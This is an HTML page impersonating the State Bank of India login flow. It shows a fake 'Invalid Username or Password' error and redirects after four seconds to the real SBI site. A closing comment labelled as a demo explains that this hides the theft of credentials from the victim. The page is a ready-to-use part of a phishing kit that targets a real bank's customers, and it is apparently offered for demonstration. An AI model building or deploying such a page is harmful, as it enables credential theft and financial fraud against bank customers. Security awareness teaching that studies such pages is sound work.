<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SBI | Login Error</title>
  <meta http-equiv="refresh" content="4;url=https://www.onlinesbi.sbi/">
  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Noto Sans', sans-serif; background: #f0f4f8; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
    .box { background: white; border-radius: 10px; padding: 40px 36px; max-width: 420px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.10); }
    .icon { font-size: 48px; margin-bottom: 12px; }
    h2 { color: #d32f2f; font-size: 18px; margin-bottom: 10px; }
    p { font-size: 14px; color: #555; line-height: 1.6; }
    .spinner { width: 36px; height: 36px; border: 3px solid #eee; border-top-color: #22409a; border-radius: 50%; animation: spin 0.9s linear infinite; margin: 18px auto 6px; }
    @keyframes spin { to { transform: rotate(360deg); } }
    small { color: #aaa; font-size: 12px; }
  </style>
</head>
<body>
  <div class="box">
    <div class="icon">⚠️</div>
    <h2>Invalid Username or Password</h2>
    <p>The credentials you entered are incorrect. Please check and try again.</p>
    <div class="spinner"></div>
    <p>Redirecting to SBI official site...</p>
    <small>You will be redirected in 4 seconds</small>
  </div>
</body>
</html>

<!--
  NOTE for Demo:
  Real phishing attacks redirect victim to the REAL website after credential capture.
  Victim thinks they mistyped password — tries again on real site.
  Meanwhile hacker already has the credentials!
-->
